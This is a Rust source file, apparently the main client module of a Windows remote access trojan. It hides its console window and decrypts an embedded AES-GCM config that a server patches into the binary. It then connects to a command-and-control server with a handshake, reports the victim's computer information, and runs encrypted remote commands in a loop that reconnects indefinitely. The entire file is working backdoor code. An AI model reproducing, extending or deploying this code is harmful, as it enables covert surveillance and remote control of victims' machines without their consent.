#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
///////////////////////////////////////////////////////////////////
// server patches config into this area
#[used]
#[unsafe(no_mangle)]
#[unsafe(link_section = ".rscdt")]
pub static _CONFIG_DATA: [u8; 4096] = [0xAA; 4096];
///////////////////////////////////////////////////////////////////

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use std::sync::Arc;

use aes_gcm::aead::consts::U32;
use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use shared::commands::{BaseCommand, BaseResponse};
use shared::crypto::Encryption;
use shared::types::ClientConfig;
use smol::channel;
use smol::{
    io::{self, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt},
    lock::Mutex,
    net::TcpStream,
};
use winapi::um::winuser::{MB_ICONERROR, MB_OKCANCEL, MessageBoxW};

use crate::commands::computer_info;
use crate::threading::ActiveCommands;

mod capture;
mod commands;
mod handler;
mod input;
mod threading;

pub fn wstring(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

/////////////////////////
/*fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    unsafe {
        std::ptr::read_volatile(_CONFIG_DATA.as_ptr()); // reads from _CONFIG_DATA

        // now read the length of the config
        let length_ptr = _CONFIG_DATA.as_ptr() as *const u32;
        let length = std::ptr::read_volatile(length_ptr).to_le() as usize;

        if length == 0 || length > 4092 { // no config found, or bigger than expected (somehow)?
            MessageBoxW( // show Windows MessageBox to user
                null_mut(),
                wstring("Failed to read config!").as_ptr(),
                wstring("Error").as_ptr(),
                MB_OKCANCEL | MB_ICONERROR,
            );
            return Err("Failed to read config!".into());
        }
        //////////////////////////////////////////////////

        let config_start = _CONFIG_DATA.as_ptr().add(4); // config starts HERE, skip first 4 bytes (they are the length)
        let mut config_trimmed = vec![0u8; length]; // new Vec holding the config data
        for i in 0..length {
            config_trimmed[i] = std::ptr::read_volatile(config_start.add(i)); // fill new Vec with bytes
        }

        Ok(config_trimmed) // return the encrypted config data as bytes
    }
}*/
fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    unsafe {
        std::ptr::read_volatile(_CONFIG_DATA.as_ptr()); // reads from _CONFIG_DATA

        // Now read the length
        let length_ptr = _CONFIG_DATA.as_ptr() as *const u32;
        let length = std::ptr::read_volatile(length_ptr).to_le() as usize;

        if length == 0 || length > 4092 {
            MessageBoxW(
                null_mut(),
                wstring("Failed to read config!").as_ptr(),
                wstring("Error").as_ptr(),
                MB_OKCANCEL | MB_ICONERROR,
            );
            return Err("Failed to read config!".into());
        }
        //////////////////////////////////////////////////

        // STAGE 2: TRY TO READ THE CONFIG
        let config_start = _CONFIG_DATA.as_ptr().add(4);
        let mut config_trimmed = vec![0u8; length];
        for i in 0..length {
            config_trimmed[i] = std::ptr::read_volatile(config_start.add(i));
        }

        Ok(config_trimmed)
    }
}
fn decrypt(
    config_trimmed: &Vec<u8>,
) -> Result<(ClientConfig, &GenericArray<u8, U32>), Box<dyn std::error::Error>> {
    let key: &GenericArray<u8, U32> = Key::<Aes256Gcm>::from_slice(&config_trimmed[0..32]); // get key from bytes
    let nonce = Nonce::from_slice(&config_trimmed[32..44]); // get nonce from bytes
    let ciphertext = &config_trimmed[44..]; // encrypted config is the rest of the bytes

    let cipher = Aes256Gcm::new(key); // make cipher to decrypt the config, we will scaffold real encryption later on, no point yet
    // because connection to server is not guaranteed
    let config = cipher
        .decrypt(nonce, ciphertext) // try to decrypt the config using the nonce and the cipher we just made
        .map_err(|e| e.to_string())
        .unwrap();

    let (client_config, _length): (ClientConfig, usize) =
        bincode::decode_from_slice(&config, bincode::config::standard())?; // convert bytes to struct using bincode

    Ok((client_config, key)) // return config and the key for encryption
}
/////////////////////////

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config_buffer = config()?;
    let (config, _key) = decrypt(&config_buffer)?;
    let socket = format!("{0}:{1}", &config.address, &config.port);

    smol::block_on(async move {
        let mut connected = false;
        for attempt in 1..=5 { // on first connection, only try 5 times
            println!("[*][main] connection attempt #{}", attempt);
            match try_connect(&socket, &config, _key).await {
                Ok(_) => {
                    connected = true;
                    break;
                }
                Err(e) => {
                    println!("[x][main] attempt #{} failed: {}", attempt, e);
                    if attempt < 5 {
                        smol::Timer::after(std::time::Duration::from_secs(10)).await;
                    }
                }
            }
        }

        if !connected {
            println!("[x][main] connection could not be made to server, closing");
            return Err("failed to connect on startup".into());
        }

        loop { // reconnect loop
            println!("[*][main] entering reconnect loop - waiting 10s");
            smol::Timer::after(std::time::Duration::from_secs(10)).await;
            match connect(&socket, &config, _key).await {
                Ok(_) => println!("[*][main] clean disconnect - still reconnect anyway"),
                // must implement 'Disconnect' in the server closing the client completely, killing the task
                // make it a command instead. this won't take long. it'll just run `std::process::exit(0)`
                Err(e) => println!("[x][main] reconnect failed: {}", e),
            }
        }
    })
}

async fn connect(
    socket: &str,
    config: &ClientConfig,
    key: &GenericArray<u8, U32>,
) -> Result<(), Box<dyn std::error::Error>> {
    let stream = TcpStream::connect(socket).await?;
    let (mut reader, writer) = io::split(stream);
    let writer = Arc::new(Mutex::new(writer));

    println!("[*][connect] sending handshake");
    writer
        .lock()
        .await
        .write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32])
        .await?;

    println!("[*][connect] waiting for response");
    let mut response = [0; 5];
    reader.read_exact(&mut response).await?;

    if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
        println!("[v][connect] handshake successful; sending mutex");
        writer
            .lock()
            .await
            .write_all(config.mutex.as_slice())
            .await?;
    } else {
        println!("[x][connect] handshake failed");
        return Err("failed handshake with server".into());
    }

    let encryption = Encryption::new(key);

    if let Ok(res) = computer_info::main() {
        let computer_info_payload = BaseResponse {
            id: 0,
            response: res,
        };
        let _ = send(
            &mut *writer.lock().await,
            &encryption,
            bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
        )
        .await;
    } else {
        println!("[x][connect] failed to run computer_info::main");
    }

    match wait(reader, writer, encryption).await {
        Ok(_) => println!("[*][connect] wait loop exited gracefully"),
        Err(e) => println!("[x][connect] wait loop error: {}", e),
    }

    Ok(())
}

async fn send(
    stream: &mut (impl AsyncWrite + Unpin + Send + 'static),
    encryption: &Encryption,
    buf: Vec<u8>,
) -> Result<(), std::io::Error> {
    if let Ok((nonce, encrypted)) = encryption.encrypt(&buf) {
        let mut payload = Vec::new();
        payload.extend_from_slice(&nonce);
        payload.extend_from_slice(&encrypted);

        shared::net::write(stream, &payload).await?;
        // println!("[v][send] wrote payload (size:{}) to server", &buf.len());
    }
    Ok(())
}

async fn wait(
    mut reader: impl AsyncRead + Unpin + Send + 'static,
    writer: Arc<Mutex<impl AsyncWrite + Unpin + Send + 'static>>,
    encryption: Encryption,
) -> Result<(), std::io::Error> {
    println!("[*][wait] entered loop");

    // this is the main loop that runs after connecting to the server
    // wait for data -> decrypt -> handle command -> send response

    // make a channel where one thread can send responses to another thread that will write them to the tcp stream.
    // we need this because the thread that handles commands is not the same thread that reads from the server.
    let (response_tx, response_rx) = channel::unbounded();

    // most responsible for keeping track of commands that are still running
    // gives us the ability to stop them if needed
    let mut active = ActiveCommands::new();
    let encryption = Arc::new(encryption); // shared pointer to the encryption object. only ever needs to be read, so no mutex.

    let stream_writer = writer.clone(); // arc pointer, so cheap to clone. moves into new thread
    let encryption_writer = encryption.clone(); // another arc pointer to encryption
    smol::spawn(async move {
        while let Ok(response_data) = response_rx.recv().await {
            // response_rx is moved to a new thread here
            // we use response_rx to anticipate the response of a command when it's completed running
            if let Err(e) = send(
                &mut *stream_writer.lock().await, // so is the writer clone
                &encryption_writer,               // so is the encryption clone...
                response_data,
            )
            .await
            {
                println!("[x][wait] failed to send response: {}", e);
                break; // error handling
            }
        }
    })
    .detach(); // allow it to run independently

    loop {
        // the main thread now falls into this loop
        match shared::net::read(&mut reader).await {
            // where we wait for data over the tcp stream
            Ok(buf) => {
                // println!("[*][wait] reading data from server");
                let mut nonce = [0u8; 12]; // make space for nonce
                nonce.copy_from_slice(&buf[..12]); // read nonce from the first 12 bytes of the data
                let buffer = &buf[12..]; // the rest is encrypted data
                if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) {
                    // decrypt using nonce+data
                    let (command, _size): (BaseCommand, usize) =
                        bincode::decode_from_slice(&decrypted, bincode::config::standard())
                            .unwrap(); // decode to make it a struct using bincode

                    let response_tx = response_tx.clone(); // clone sender so we can move it into our new thread that handles the command
                    active.spawn(command, response_tx).await; // spawn the command in the active commands handler, keeping track of it.
                // we pass through the response_tx variable because when the command sends its response through the channel when done
                // and 'tx' is connected to 'rx' since response_rx will receive this response and send it over tcp.
                } else {
                    println!("[x][wait] decryption failed");
                }
            }
            Err(e) => {
                println!("[x][wait] {}", e);
                if e.kind() != std::io::ErrorKind::FileTooLarge {
                    break Ok(()); // we break if something goes wrong while listening for commands.
                }
            }
        };
    }
}
